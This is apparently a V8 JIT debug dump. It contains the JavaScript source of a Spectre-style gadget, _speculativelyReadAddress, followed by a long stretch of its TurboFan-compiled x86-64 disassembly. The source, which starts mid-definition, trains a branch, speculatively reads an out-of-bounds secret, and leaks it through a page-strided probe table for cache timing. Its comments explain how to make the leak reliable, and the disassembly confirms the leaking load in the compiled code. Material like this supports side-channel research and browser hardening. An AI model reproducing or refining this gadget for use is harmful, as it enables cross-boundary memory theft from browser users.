0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
--- Raw source ---
() {
    const probe_table = new Uint8Array((1 + probe_length) * page_size);
    // run the speculative execution at least twice
    // the first run causes secret_table[fixed_index] to be loaded from RAM (cache miss)
    // this means that the speculative branch takes long to execute and thus is likely to get caught by the branch rollback
    // the second time that the speculative execution runs, secret_table[fixed_index] is already cached and therefore fast
    for (let j = 0; j < speculative_repetitions; ++j) {
        const delay_array = new Uint8Array(2 * page_size);
        for (let i = training_number; i > 0; --i) {
            // helper variables to optimize assembly code
            const invalid_access = (i == 1) | 0;
            const fixed_address = address * invalid_access;
            const fixed_page_size = page_size * invalid_access;
            // if (invalid_access) {
            // }
            // ensure evaluation before jump condition
            junk ^= fixed_address | fixed_page_size;
            // load condition from RAM so speculative execution gets triggered
            if (delay_array[fixed_page_size] || !invalid_access) {
                const secret_value = secret_table[fixed_address];
                // map valid accesses to the address (probe_tables)
                // map invalid accesses to their respective probe boxes
                junk ^= probe_table[(1 + secret_value) * fixed_page_size & 0xffffff];
            }
        }
    }
    // probe table
    probeTable(probe_table);
}


--- Optimized code ---
optimization_id = 0
source_position = 330
kind = OPTIMIZED_FUNCTION
name = _speculativelyReadAddress
stack_slots = 28
compiler = turbofan
address = 0x622d186cce1

Instructions (size = 2432)
                  -- <not inlined:330> --
                  -- Prologue: check for deoptimization --
0x622d186cd20     0  488b59e0       REX.W movq rbx,[rcx-0x20]
0x622d186cd24     4  f6430f01       testb [rbx+0xf],0x1
0x622d186cd28     8  0f85f221f2ff   jnz 0x622d178ef20  (CompileLazyDeoptimizedCode)    ;; code: Builtin::CompileLazyDeoptimizedCode
                  -- B0 start (construct frame) --
0x622d186cd2e     e  55             push rbp
0x622d186cd2f     f  4889e5         REX.W movq rbp,rsp
0x622d186cd32    12  56             push rsi
0x622d186cd33    13  57             push rdi
0x622d186cd34    14  48ba0000000027000000 REX.W movq rdx,0x2700000000
0x622d186cd3e    1e  e83d0bf3ff     call 0x622d179d880  (Abort)    ;; code: Builtin::Abort
0x622d186cd43    23  cc             int3l
                  -- OSR entrypoint --
0x622d186cd44    24  4883ec58       REX.W subq rsp,0x58
0x622d186cd48    28  48897580       REX.W movq [rbp-0x80],rsi
0x622d186cd4c    2c  4c8b55a8       REX.W movq r10,[rbp-0x58]
0x622d186cd50    30  4c899578ffffff REX.W movq [rbp-0x88],r10
0x622d186cd57    37  488b45a0       REX.W movq rax,[rbp-0x60]
0x622d186cd5b    3b  0f1f440000     nop
                  -- B1 start (loop up to 53) --
                  -- <not inlined:817> --
0x622d186cd60    40  488b5e37       REX.W movq rbx,[rsi+0x37]
                  -- <not inlined:819> --
0x622d186cd64    44  49395da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),rbx
0x622d186cd68    48  0f840e080000   jz 0x622d186d57c  <+0x85c>
                  -- B2 start (in loop 1) --
                  -- <not inlined:817> --
0x622d186cd6e    4e  488b9578ffffff REX.W movq rdx,[rbp-0x88]
0x622d186cd75    55  f6c201         testb rdx,0x1
0x622d186cd78    58  0f8526080000   jnz 0x622d186d5a4  <+0x884>
0x622d186cd7e    5e  f6c301         testb rbx,0x1
0x622d186cd81    61  0f8522080000   jnz 0x622d186d5a9  <+0x889>
0x622d186cd87    67  483bd3         REX.W cmpq rdx,rbx
0x622d186cd8a    6a  0f8d11040000   jge 0x622d186d1a1  <+0x481>
                  -- B3 start (in loop 1) --
                  -- <not inlined:799> --
0x622d186cd90    70  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32764))
0x622d186cd97    77  0f8629040000   jna 0x622d186d1c6  <+0x4a6>
                  -- B5 start (in loop 1) --
                  -- B6 start (in loop 1) --
                  -- <not inlined:879> --
0x622d186cd9d    7d  488b4e47       REX.W movq rcx,[rsi+0x47]
                  -- <not inlined:898> --
0x622d186cda1    81  49394da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),rcx
0x622d186cda5    85  0f84aa070000   jz 0x622d186d555  <+0x835>
                  -- B7 start (in loop 1) --
                  -- <not inlined:896> --
0x622d186cdab    8b  f6c101         testb rcx,0x1
0x622d186cdae    8e  0f85fa070000   jnz 0x622d186d5ae  <+0x88e>
0x622d186cdb4    94  48c1e920       REX.W shrq rcx, 32
0x622d186cdb8    98  488bf9         REX.W movq rdi,rcx
0x622d186cdbb    9b  03f9           addl rdi,rcx
0x622d186cdbd    9d  0f80f0070000   jo 0x622d186d5b3  <+0x893>
                  -- <not inlined:879> --
0x622d186cdc3    a3  488bdf         REX.W movq rbx,rdi
0x622d186cdc6    a6  48c1e320       REX.W shlq rbx, 32
0x622d186cdca    aa  4889bd70ffffff REX.W movq [rbp-0x90],rdi
0x622d186cdd1    b1  4c8bc8         REX.W movq r9,rax
0x622d186cdd4    b4  48b8e927d13b2a3b0000 REX.W movq rax,0x3b2a3bd127e9    ;; object: 0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>
0x622d186cdde    be  4c8be7         REX.W movq r12,rdi
0x622d186cde1    c1  488bcb         REX.W movq rcx,rbx
0x622d186cde4    c4  4c8bda         REX.W movq r11,rdx
0x622d186cde7    c7  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x2b18c95025b1 <undefined>))
0x622d186cdeb    cb  4c8bc6         REX.W movq r8,rsi
0x622d186cdee    ce  488bd8         REX.W movq rbx,rax
0x622d186cdf1    d1  488bfa         REX.W movq rdi,rdx
0x622d186cdf4    d4  e867ebf5ff     call 0x622d17cb960  (CreateTypedArray)    ;; code: Builtin::CreateTypedArray
                  -- <not inlined:931> --
0x622d186cdf9    d9  488b5580       REX.W movq rdx,[rbp-0x80]
0x622d186cdfd    dd  488b5a3f       REX.W movq rbx,[rdx+0x3f]
0x622d186ce01    e1  48898570ffffff REX.W movq [rbp-0x90],rax
0x622d186ce08    e8  49395da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),rbx
0x622d186ce0c    ec  0f841c070000   jz 0x622d186d52e  <+0x80e>
                  -- B8 start (in loop 1) --
                  -- <not inlined:950> --
0x622d186ce12    f2  f6c301         testb rbx,0x1
0x622d186ce15    f5  0f85a2070000   jnz 0x622d186d5bd  <+0x89d>
0x622d186ce1b    fb  4883fb00       REX.W cmpq rbx,0x0
0x622d186ce1f    ff  0f8f09000000   jg 0x622d186ce2e  <+0x10e>
                  -- B9 start (in loop 1) --
0x622d186ce25   105  4c8b4da0       REX.W movq r9,[rbp-0x60]
0x622d186ce29   109  e949030000     jmp 0x622d186d177  <+0x457>
                  -- B10 start (in loop 1) --
                  -- <not inlined:918> --
0x622d186ce2e   10e  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32764))
0x622d186ce35   115  0f86c2030000   jna 0x622d186d1fd  <+0x4dd>
                  -- B12 start (in loop 1) --
                  -- B13 start (in loop 1) --
                  -- <not inlined:1103> --
0x622d186ce3b   11b  488b4a4f       REX.W movq rcx,[rdx+0x4f]
                  -- <not inlined:1058> --
0x622d186ce3f   11f  48be0000000001000000 REX.W movq rsi,0x100000000
0x622d186ce49   129  483bf3         REX.W cmpq rsi,rbx
0x622d186ce4c   12c  400f94c6       setzl sil
0x622d186ce50   130  400fb6f6       movzxbl rsi,rsi
                  -- <not inlined:1103> --
0x622d186ce54   134  49394da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),rcx
0x622d186ce58   138  0f849b060000   jz 0x622d186d4f9  <+0x7d9>
                  -- B14 start (in loop 1) --
                  -- <not inlined:1111> --
0x622d186ce5e   13e  f6c101         testb rcx,0x1
0x622d186ce61   141  0f855b070000   jnz 0x622d186d5c2  <+0x8a2>
0x622d186ce67   147  48c1e920       REX.W shrq rcx, 32
0x622d186ce6b   14b  488bf9         REX.W movq rdi,rcx
0x622d186ce6e   14e  0faffe         imull rdi,rsi
0x622d186ce71   151  0f8050070000   jo 0x622d186d5c7  <+0x8a7>
0x622d186ce77   157  48898d30ffffff REX.W movq [rbp-0xd0],rcx
0x622d186ce7e   15e  83ff00         cmpl rdi,0x0
0x622d186ce81   161  0f84a6030000   jz 0x622d186d22d  <+0x50d>
                  -- B15 start (in loop 1) --
                  -- B17 start (in loop 1) --
                  -- <not inlined:1165> --
0x622d186ce87   167  4c8b4247       REX.W movq r8,[rdx+0x47]
0x622d186ce8b   16b  4d3945a8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),r8
0x622d186ce8f   16f  0f8428060000   jz 0x622d186d4bd  <+0x79d>
                  -- B18 start (in loop 1) --
                  -- <not inlined:1175> --
0x622d186ce95   175  4d8bc8         REX.W movq r9,r8
0x622d186ce98   178  49c1e920       REX.W shrq r9, 32
0x622d186ce9c   17c  41f6c001       testb r8,0x1
0x622d186cea0   180  0f8526070000   jnz 0x622d186d5cc  <+0x8ac>
0x622d186cea6   186  4d8bc1         REX.W movq r8,r9
0x622d186cea9   189  440fafc6       imull r8,rsi
0x622d186cead   18d  0f801e070000   jo 0x622d186d5d1  <+0x8b1>
0x622d186ceb3   193  4c898d38ffffff REX.W movq [rbp-0xc8],r9
0x622d186ceba   19a  4c898550ffffff REX.W movq [rbp-0xb0],r8
0x622d186cec1   1a1  4183f800       cmpl r8,0x0
0x622d186cec5   1a5  0f84b2030000   jz 0x622d186d27d  <+0x55d>
                  -- B19 start (in loop 1) --
                  -- B21 start (in loop 1) --
                  -- <not inlined:1314> --
0x622d186cecb   1ab  4c8b5a2f       REX.W movq r11,[rdx+0x2f]
0x622d186cecf   1af  4d395da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),r11
0x622d186ced3   1b3  0f849a050000   jz 0x622d186d473  <+0x753>
                  -- B22 start (in loop 1) --
                  -- <not inlined:1336> --
0x622d186ced9   1b9  4c8be7         REX.W movq r12,rdi
0x622d186cedc   1bc  450be0         orl r12,r8
0x622d186cedf   1bf  4d8bf3         REX.W movq r14,r11
0x622d186cee2   1c2  49c1ee20       REX.W shrq r14, 32
0x622d186cee6   1c6  4533e6         xorl r12,r14
0x622d186cee9   1c9  41f6c301       testb r11,0x1
0x622d186ceed   1cd  0f85e3060000   jnz 0x622d186d5d6  <+0x8b6>
                  -- <not inlined:1319> --
0x622d186cef3   1d3  4d89e3         REX.W movq r11,r12
0x622d186cef6   1d6  49c1e320       REX.W shlq r11, 32
0x622d186cefa   1da  4c895a2f       REX.W movq [rdx+0x2f],r11
                  -- <not inlined:1461> --
0x622d186cefe   1de  49be81476012c0080000 REX.W movq r14,0x8c012604781    ;; object: 0x08c012604781 <Map(UINT8_ELEMENTS)>
0x622d186cf08   1e8  4c3970ff       REX.W cmpq [rax-0x1],r14
0x622d186cf0c   1ec  0f85c9060000   jnz 0x622d186d5db  <+0x8bb>
0x622d186cf12   1f2  4c8b7817       REX.W movq r15,[rax+0x17]
0x622d186cf16   1f6  488b480f       REX.W movq rcx,[rax+0xf]
0x622d186cf1a   1fa  488b4917       REX.W movq rcx,[rcx+0x17]
0x622d186cf1e   1fe  448b4833       movl r9,[rax+0x33]
0x622d186cf22   202  453bc1         cmpl r8,r9
0x622d186cf25   205  0f83b5060000   jnc 0x622d186d5e0  <+0x8c0>
0x622d186cf2b   20b  460fb60c01     movzxbl r9,[rcx+r8*1]
0x622d186cf30   210  4c89bd40ffffff REX.W movq [rbp-0xc0],r15
0x622d186cf37   217  48898d48ffffff REX.W movq [rbp-0xb8],rcx
0x622d186cf3e   21e  4183f900       cmpl r9,0x0
0x622d186cf42   222  0f8512000000   jnz 0x622d186cf5a  <+0x23a>
                  -- B23 start (in loop 1) --
                  -- B24 start (in loop 1) --
                  -- <not inlined:1483> --
0x622d186cf48   228  83fe00         cmpl rsi,0x0
0x622d186cf4b   22b  0f8409000000   jz 0x622d186cf5a  <+0x23a>
                  -- B25 start (in loop 1) --
0x622d186cf51   231  4c8b4da0       REX.W movq r9,[rbp-0x60]
0x622d186cf55   235  e99d000000     jmp 0x622d186cff7  <+0x2d7>
                  -- B26 start (in loop 1) --
                  -- B27 start (in loop 1) --
                  -- <not inlined:1538> --
0x622d186cf5a   23a  4c8b4a5f       REX.W movq r9,[rdx+0x5f]
0x622d186cf5e   23e  4d394da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),r9
0x622d186cf62   242  0f84cf040000   jz 0x622d186d437  <+0x717>
                  -- B28 start (in loop 1) --
                  -- <not inlined:1550> --
0x622d186cf68   248  41f6c101       testb r9,0x1
0x622d186cf6c   24c  0f8473060000   jz 0x622d186d5e5  <+0x8c5>
0x622d186cf72   252  4d3971ff       REX.W cmpq [r9-0x1],r14
0x622d186cf76   256  0f856e060000   jnz 0x622d186d5ea  <+0x8ca>
0x622d186cf7c   25c  4d8b7917       REX.W movq r15,[r9+0x17]
0x622d186cf80   260  498b490f       REX.W movq rcx,[r9+0xf]
0x622d186cf84   264  458b4933       movl r9,[r9+0x33]
0x622d186cf88   268  488b4917       REX.W movq rcx,[rcx+0x17]
0x622d186cf8c   26c  413bf9         cmpl rdi,r9
0x622d186cf8f   26f  0f835a060000   jnc 0x622d186d5ef  <+0x8cf>
0x622d186cf95   275  0fb60c39       movzxbl rcx,[rcx+rdi*1]
                  -- <not inlined:1723> --
0x622d186cf99   279  4d395da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),r11
0x622d186cf9d   27d  0f8455040000   jz 0x622d186d3f8  <+0x6d8>
                  -- B29 start (in loop 1) --
                  -- <not inlined:1746> --
0x622d186cfa3   283  83c101         addl rcx,0x1
                  -- <not inlined:1762> --
0x622d186cfa6   286  410fafc8       imull rcx,r8
0x622d186cfaa   28a  0f8044060000   jo 0x622d186d5f4  <+0x8d4>
                  -- <not inlined:1742> --
0x622d186cfb0   290  f645a001       testb [rbp-0x60],0x1
0x622d186cfb4   294  0f843f060000   jz 0x622d186d5f9  <+0x8d9>
0x622d186cfba   29a  4c8b4da0       REX.W movq r9,[rbp-0x60]
0x622d186cfbe   29e  4d3971ff       REX.W cmpq [r9-0x1],r14
0x622d186cfc2   2a2  0f8536060000   jnz 0x622d186d5fe  <+0x8de>
0x622d186cfc8   2a8  4d8b5917       REX.W movq r11,[r9+0x17]
0x622d186cfcc   2ac  4d8b790f       REX.W movq r15,[r9+0xf]
0x622d186cfd0   2b0  458b4133       movl r8,[r9+0x33]
                  -- <not inlined:1780> --
0x622d186cfd4   2b4  81e1ffffff00   andl rcx,0xffffff
                  -- <not inlined:1742> --
0x622d186cfda   2ba  4d8b7f17       REX.W movq r15,[r15+0x17]
0x622d186cfde   2be  413bc8         cmpl rcx,r8
0x622d186cfe1   2c1  0f831c060000   jnc 0x622d186d603  <+0x8e3>
0x622d186cfe7   2c7  410fb60c0f     movzxbl rcx,[r15+rcx*1]
0x622d186cfec   2cc  4431e1         xorl rcx,r12
                  -- <not inlined:1728> --
0x622d186cfef   2cf  48c1e120       REX.W shlq rcx, 32
0x622d186cff3   2d3  48894a2f       REX.W movq [rdx+0x2f],rcx
                  -- B30 start (in loop 1) --
                  -- <not inlined:957> --
0x622d186cff7   2d7  488bcb         REX.W movq rcx,rbx
0x622d186cffa   2da  48c1e920       REX.W shrq rcx, 32
0x622d186cffe   2de  83e901         subl rcx,0x1
0x622d186d001   2e1  0f8001060000   jo 0x622d186d608  <+0x8e8>
0x622d186d007   2e7  488b9d48ffffff REX.W movq rbx,[rbp-0xb8]
0x622d186d00e   2ee  6690           nop
                  -- B31 start (loop up to 51) (in loop 1) --
                  -- <not inlined:950> --
0x622d186d010   2f0  83f900         cmpl rcx,0x0
0x622d186d013   2f3  0f8e5e010000   jle 0x622d186d177  <+0x457>
                  -- B32 start (in loop 31) --
                  -- <not inlined:918> --
0x622d186d019   2f9  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32764))
0x622d186d020   300  0f86ae020000   jna 0x622d186d2d4  <+0x5b4>
                  -- B34 start (in loop 31) --
                  -- B35 start (in loop 31) --
                  -- <not inlined:1058> --
0x622d186d026   306  83f901         cmpl rcx,0x1
0x622d186d029   309  400f94c6       setzl sil
0x622d186d02d   30d  400fb6f6       movzxbl rsi,rsi
                  -- <not inlined:1111> --
0x622d186d031   311  488bbd30ffffff REX.W movq rdi,[rbp-0xd0]
0x622d186d038   318  0faffe         imull rdi,rsi
0x622d186d03b   31b  0f80cc050000   jo 0x622d186d60d  <+0x8ed>
0x622d186d041   321  4889b560ffffff REX.W movq [rbp-0xa0],rsi
0x622d186d048   328  83ff00         cmpl rdi,0x0
0x622d186d04b   32b  0f84c8020000   jz 0x622d186d319  <+0x5f9>
                  -- B36 start (in loop 31) --
                  -- B38 start (in loop 31) --
                  -- <not inlined:1175> --
0x622d186d051   331  4c8b8538ffffff REX.W movq r8,[rbp-0xc8]
0x622d186d058   338  440fafc6       imull r8,rsi
0x622d186d05c   33c  0f80b0050000   jo 0x622d186d612  <+0x8f2>
0x622d186d062   342  4183f800       cmpl r8,0x0
0x622d186d066   346  0f84f2020000   jz 0x622d186d35e  <+0x63e>
                  -- B39 start (in loop 31) --
                  -- B41 start (in loop 31) --
                  -- <not inlined:1314> --
0x622d186d06c   34c  4c8b5a2f       REX.W movq r11,[rdx+0x2f]
0x622d186d070   350  4d395da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),r11
0x622d186d074   354  0f8456030000   jz 0x622d186d3d0  <+0x6b0>
                  -- B42 start (in loop 31) --
                  -- <not inlined:1336> --
0x622d186d07a   35a  4c8be7         REX.W movq r12,rdi
0x622d186d07d   35d  450be0         orl r12,r8
0x622d186d080   360  4d8bfb         REX.W movq r15,r11
0x622d186d083   363  49c1ef20       REX.W shrq r15, 32
0x622d186d087   367  4533e7         xorl r12,r15
                  -- <not inlined:1723> --
0x622d186d08a   36a  4d89e7         REX.W movq r15,r12
0x622d186d08d   36d  49c1e720       REX.W shlq r15, 32
                  -- <not inlined:1336> --
0x622d186d091   371  41f6c301       testb r11,0x1
0x622d186d095   375  0f857c050000   jnz 0x622d186d617  <+0x8f7>
                  -- <not inlined:1319> --
0x622d186d09b   37b  4c897a2f       REX.W movq [rdx+0x2f],r15
                  -- <not inlined:1461> --
0x622d186d09f   37f  448b5833       movl r11,[rax+0x33]
0x622d186d0a3   383  453bc3         cmpl r8,r11
0x622d186d0a6   386  0f8370050000   jnc 0x622d186d61c  <+0x8fc>
0x622d186d0ac   38c  460fb61c03     movzxbl r11,[rbx+r8*1]
0x622d186d0b1   391  4183fb00       cmpl r11,0x0
0x622d186d0b5   395  0f8509000000   jnz 0x622d186d0c4  <+0x3a4>
                  -- B43 start (in loop 31) --
                  -- B44 start (in loop 31) --
                  -- <not inlined:1483> --
0x622d186d0bb   39b  83fe00         cmpl rsi,0x0
0x622d186d0be   39e  0f8598000000   jnz 0x622d186d15c  <+0x43c>
                  -- B45 start (in loop 31) --
                  -- B46 start (in loop 31) --
                  -- B47 start (in loop 31) --
                  -- <not inlined:1538> --
0x622d186d0c4   3a4  4c8b5a5f       REX.W movq r11,[rdx+0x5f]
0x622d186d0c8   3a8  4d395da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),r11
0x622d186d0cc   3ac  0f84e4020000   jz 0x622d186d3b6  <+0x696>
                  -- B48 start (in loop 31) --
                  -- <not inlined:1550> --
0x622d186d0d2   3b2  41f6c301       testb r11,0x1
0x622d186d0d6   3b6  0f8445050000   jz 0x622d186d621  <+0x901>
0x622d186d0dc   3bc  4d3973ff       REX.W cmpq [r11-0x1],r14
0x622d186d0e0   3c0  0f8540050000   jnz 0x622d186d626  <+0x906>
0x622d186d0e6   3c6  498b7317       REX.W movq rsi,[r11+0x17]
0x622d186d0ea   3ca  498b430f       REX.W movq rax,[r11+0xf]
0x622d186d0ee   3ce  458b5b33       movl r11,[r11+0x33]
0x622d186d0f2   3d2  488b4017       REX.W movq rax,[rax+0x17]
0x622d186d0f6   3d6  413bfb         cmpl rdi,r11
0x622d186d0f9   3d9  0f832c050000   jnc 0x622d186d62b  <+0x90b>
0x622d186d0ff   3df  0fb60438       movzxbl rax,[rax+rdi*1]
                  -- <not inlined:1723> --
0x622d186d103   3e3  4d397da8       REX.W cmpq [r13-0x58] (root (0x2b18c9502691 <the_hole>)),r15
0x622d186d107   3e7  0f8496020000   jz 0x622d186d3a3  <+0x683>
                  -- B49 start (in loop 31) --
                  -- <not inlined:1746> --
0x622d186d10d   3ed  83c001         addl rax,0x1
                  -- <not inlined:1762> --
0x622d186d110   3f0  410fafc0       imull rax,r8
0x622d186d114   3f4  0f8016050000   jo 0x622d186d630  <+0x910>
                  -- <not inlined:1742> --
0x622d186d11a   3fa  41f6c101       testb r9,0x1
0x622d186d11e   3fe  0f8411050000   jz 0x622d186d635  <+0x915>
0x622d186d124   404  4d3971ff       REX.W cmpq [r9-0x1],r14
0x622d186d128   408  0f850c050000   jnz 0x622d186d63a  <+0x91a>
0x622d186d12e   40e  498b7117       REX.W movq rsi,[r9+0x17]
0x622d186d132   412  4d8b590f       REX.W movq r11,[r9+0xf]
0x622d186d136   416  458b7933       movl r15,[r9+0x33]
                  -- <not inlined:1780> --
0x622d186d13a   41a  25ffffff00     and rax,0xffffff
                  -- <not inlined:1742> --
0x622d186d13f   41f  4d8b5b17       REX.W movq r11,[r11+0x17]
0x622d186d143   423  413bc7         cmpl rax,r15
0x622d186d146   426  0f83f3040000   jnc 0x622d186d63f  <+0x91f>
0x622d186d14c   42c  410fb60403     movzxbl rax,[r11+rax*1]   ;; [r11+rax*1] is probe_table[...]
0x622d186d151   431  4431e0         xorl rax,r12
                  -- <not inlined:1728> --
0x622d186d154   434  48c1e020       REX.W shlq rax, 32
0x622d186d158   438  4889422f       REX.W movq [rdx+0x2f],rax
                  -- B50 start (in loop 31) --
                  -- <not inlined:957> --
0x622d186d15c   43c  488bc1         REX.W movq rax,rcx
0x622d186d15f   43f  83e801         subl rax,0x1
0x622d186d162   442  0f80dc040000   jo 0x622d186d644  <+0x924>
0x622d186d168   448  488bc8         REX.W movq rcx,rax
0x622d186d16b   44b  488b8570ffffff REX.W movq rax,[rbp-0x90]
0x622d186d172   452  e999feffff     jmp 0x622d186d010  <+0x2f0>
                  -- B51 start (in loop 1) --
                  -- B52 start (in loop 1) --
                  -- <not inlined:846> --
0x622d186d177   457  488b8578ffffff REX.W movq rax,[rbp-0x88]
0x622d186d17e   45e  48c1e820       REX.W shrq rax, 32
0x622d186d182   462  83c001         addl rax,0x1
0x622d186d185   465  0f80be040000   jo 0x622d186d649  <+0x929>
                  -- <not inlined:817> --
0x622d186d18b   46b  48c1e020       REX.W shlq rax, 32
0x622d186d18f   46f  48898578ffffff REX.W movq [rbp-0x88],rax
0x622d186d196   476  488bf2         REX.W movq rsi,rdx
0x622d186d199   479  498bc1         REX.W movq rax,r9
0x622d186d19c   47c  e9bffbffff     jmp 0x622d186cd60  <+0x40>
                  -- B53 start (deconstruct frame) --
                  -- <not inlined:1846> --
0x622d186d1a1   481  488bd6         REX.W movq rdx,rsi
0x622d186d1a4   484  4c8bc8         REX.W movq r9,rax
0x622d186d1a7   487  48b819d9293b97360000 REX.W movq rax,0x36973b29d919    ;; object: 0x36973b29d919 <JSFunction probeTable (sfi = 0x2c2783f96121)>
0x622d186d1b1   491  48394267       REX.W cmpq [rdx+0x67],rax
0x622d186d1b5   495  0f8593040000   jnz 0x622d186d64e  <+0x92e>
                  -- <not inlined:1871> --
0x622d186d1bb   49b  498b45a0       REX.W movq rax,[r13-0x60] (root (0x2b18c95025b1 <undefined>))
0x622d186d1bf   49f  488be5         REX.W movq rsp,rbp
0x622d186d1c2   4a2  5d             pop rbp
0x622d186d1c3   4a3  c20800         ret 0x8
                  -- B68 start (no frame) --
                  -- B4 start (deferred) (in loop 1) --
                  -- <not inlined:799> --
0x622d186d1c6   4a6  48899d70ffffff REX.W movq [rbp-0x90],rbx
0x622d186d1cd   4ad  48bbb093190100000000 REX.W movq rbx,0x11993b0
0x622d186d1d7   4b7  33c0           xorl rax,rax
0x622d186d1d9   4b9  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d1dd   4bd  e81e29f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186d1e2   4c2  488b9d70ffffff REX.W movq rbx,[rbp-0x90]
0x622d186d1e9   4c9  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d1ed   4cd  488b9578ffffff REX.W movq rdx,[rbp-0x88]
0x622d186d1f4   4d4  488b45a0       REX.W movq rax,[rbp-0x60]
0x622d186d1f8   4d8  e9a0fbffff     jmp 0x622d186cd9d  <+0x7d>
                  -- B11 start (deferred) (in loop 1) --
                  -- <not inlined:918> --
0x622d186d1fd   4dd  48899d68ffffff REX.W movq [rbp-0x98],rbx
0x622d186d204   4e4  488b1dc4ffffff REX.W movq rbx,[rip+0xffffffc4]
0x622d186d20b   4eb  33c0           xorl rax,rax
0x622d186d20d   4ed  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d211   4f1  e8ea28f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186d216   4f6  488b9d68ffffff REX.W movq rbx,[rbp-0x98]
0x622d186d21d   4fd  488b5580       REX.W movq rdx,[rbp-0x80]
0x622d186d221   501  488b8570ffffff REX.W movq rax,[rbp-0x90]
0x622d186d228   508  e90efcffff     jmp 0x622d186ce3b  <+0x11b>
                  -- B16 start (deferred) (in loop 1) --
                  -- <not inlined:1111> --
0x622d186d22d   50d  488b8530ffffff REX.W movq rax,[rbp-0xd0]
0x622d186d234   514  4889b560ffffff REX.W movq [rbp-0xa0],rsi
0x622d186d23b   51b  0b8560ffffff   orl rax,[rbp-0xa0]
0x622d186d241   521  48899d68ffffff REX.W movq [rbp-0x98],rbx
0x622d186d248   528  83f800         cmpl rax,0x0
0x622d186d24b   52b  0f8c0c040000   jl 0x622d186d65d  <+0x93d>
0x622d186d251   531  4889bd58ffffff REX.W movq [rbp-0xa8],rdi
0x622d186d258   538  488b5580       REX.W movq rdx,[rbp-0x80]
0x622d186d25c   53c  488b8570ffffff REX.W movq rax,[rbp-0x90]
0x622d186d263   543  488b9d68ffffff REX.W movq rbx,[rbp-0x98]
0x622d186d26a   54a  488bb560ffffff REX.W movq rsi,[rbp-0xa0]
0x622d186d271   551  488b8d30ffffff REX.W movq rcx,[rbp-0xd0]
0x622d186d278   558  e90afcffff     jmp 0x622d186ce87  <+0x167>
                  -- B20 start (deferred) (in loop 1) --
                  -- <not inlined:1175> --
0x622d186d27d   55d  488b8538ffffff REX.W movq rax,[rbp-0xc8]
0x622d186d284   564  4889b560ffffff REX.W movq [rbp-0xa0],rsi
0x622d186d28b   56b  0b8560ffffff   orl rax,[rbp-0xa0]
0x622d186d291   571  48899d68ffffff REX.W movq [rbp-0x98],rbx
0x622d186d298   578  83f800         cmpl rax,0x0
0x622d186d29b   57b  0f8cc1030000   jl 0x622d186d662  <+0x942>
0x622d186d2a1   581  4889bd58ffffff REX.W movq [rbp-0xa8],rdi
0x622d186d2a8   588  488b5580       REX.W movq rdx,[rbp-0x80]
0x622d186d2ac   58c  488b8570ffffff REX.W movq rax,[rbp-0x90]
0x622d186d2b3   593  488b9d68ffffff REX.W movq rbx,[rbp-0x98]
0x622d186d2ba   59a  488bb560ffffff REX.W movq rsi,[rbp-0xa0]
0x622d186d2c1   5a1  4c8b8d38ffffff REX.W movq r9,[rbp-0xc8]
0x622d186d2c8   5a8  488b8d30ffffff REX.W movq rcx,[rbp-0xd0]
0x622d186d2cf   5af  e9f7fbffff     jmp 0x622d186cecb  <+0x1ab>
                  -- B33 start (deferred) (in loop 31) --
                  -- <not inlined:918> --
0x622d186d2d4   5b4  48898d50ffffff REX.W movq [rbp-0xb0],rcx
0x622d186d2db   5bb  488b1dedfeffff REX.W movq rbx,[rip+0xfffffeed]
0x622d186d2e2   5c2  33c0           xorl rax,rax
0x622d186d2e4   5c4  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d2e8   5c8  e81328f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186d2ed   5cd  488b9d48ffffff REX.W movq rbx,[rbp-0xb8]
0x622d186d2f4   5d4  488b5580       REX.W movq rdx,[rbp-0x80]
0x622d186d2f8   5d8  4c8b4da0       REX.W movq r9,[rbp-0x60]
0x622d186d2fc   5dc  488b8570ffffff REX.W movq rax,[rbp-0x90]
0x622d186d303   5e3  488b8d50ffffff REX.W movq rcx,[rbp-0xb0]
0x622d186d30a   5ea  49be81476012c0080000 REX.W movq r14,0x8c012604781    ;; object: 0x08c012604781 <Map(UINT8_ELEMENTS)>
0x622d186d314   5f4  e90dfdffff     jmp 0x622d186d026  <+0x306>
                  -- B37 start (deferred) (in loop 31) --
                  -- <not inlined:1111> --
0x622d186d319   5f9  488b8530ffffff REX.W movq rax,[rbp-0xd0]
0x622d186d320   600  0bc6           orl rax,rsi
0x622d186d322   602  48898d50ffffff REX.W movq [rbp-0xb0],rcx
0x622d186d329   609  83f800         cmpl rax,0x0
0x622d186d32c   60c  0f8c3a030000   jl 0x622d186d66c  <+0x94c>
0x622d186d332   612  488b5580       REX.W movq rdx,[rbp-0x80]
